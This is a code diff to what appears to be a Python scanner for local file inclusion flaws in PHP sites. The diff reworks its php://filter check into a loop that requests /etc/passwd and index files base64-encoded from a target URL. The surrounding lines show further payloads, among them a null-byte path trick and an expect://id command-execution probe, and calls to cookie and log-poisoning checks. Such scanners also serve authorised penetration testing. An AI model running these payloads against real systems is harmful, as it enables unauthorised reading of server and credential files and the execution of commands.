@@ -26,8 +26,8 @@ path1 = quote("/etc/passwd")
 path2 = quote("/etc/passwd%00")
 
 # Filter
-filterBase = quote("php://filter/read=convert.base64-encode/resource=/etc/passwd")
-filterBase2 = quote("php://filter/read=convert.base64-encode/resource=index")
+filterPaths = [quote("/etc/passwd"), quote("index"), quote("index.php"), quote("index.html")]
+filterBase = quote("php://filter/read=convert.base64-encode/resource=")
 
 # Headers
 phpHeaders1 = quote("expect://id")
@@ -114,27 +114,15 @@ def headerCheck2(url):
 	
 # Checks if it can retrieve files with the php filter	
 def filterCheck(url):
-	compUrl = url + filterBase
-	check = urlopen(compUrl)
-	response = check.read().decode('utf-8')
-	clean = stripHtmlTags(response)
-	words = clean.split()
-	for i in words:
-		if i.endswith('='):
-			print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)
-			
-			
-
-			
-def filterCheck2(url):
-	compUrl = url + filterBase2
-	check = urlopen(compUrl)
-	response = check.read().decode('utf-8')
-	clean = stripHtmlTags(response)
-	words = clean.split()
-	for i in words:
-		if i.endswith('='):
-			print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)			
+	for y in filterPaths:
+		compUrl = url + filterBase + y
+		check = urlopen(compUrl)
+		response = check.read().decode('utf-8')
+		clean = stripHtmlTags(response)
+		words = clean.split()
+		for i in words:
+			if i.endswith('='):
+				print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)			
 
 
 
@@ -210,7 +198,6 @@ def main():
 			headerCheck1(url)
 			headerCheck2(url)
 			filterCheck(url)
-			filterCheck2(url)
 			cookieCheck(url)
 			logPoisonCheck(url)
 	except KeyboardInterrupt:
